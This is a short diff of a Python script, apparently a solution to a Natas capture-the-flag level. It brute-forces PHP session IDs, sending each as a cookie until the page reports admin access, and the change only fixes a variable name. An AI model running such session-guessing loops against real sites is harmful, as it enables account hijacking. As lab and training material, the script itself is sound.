@@ -44,7 +44,7 @@ while phpsesidMin <= phpsesidMax:
     log_progress_inline(sesID)
 
     headers = {'Cookie': sesID}
-    response = requests.get(u,headers=headers, auth=(username,natas19_password),verify=False)
+    response = requests.get(url,headers=headers, auth=(username,natas19_password),verify=False)
 
     if "You are an admin" in response.text:
         print(response.text)
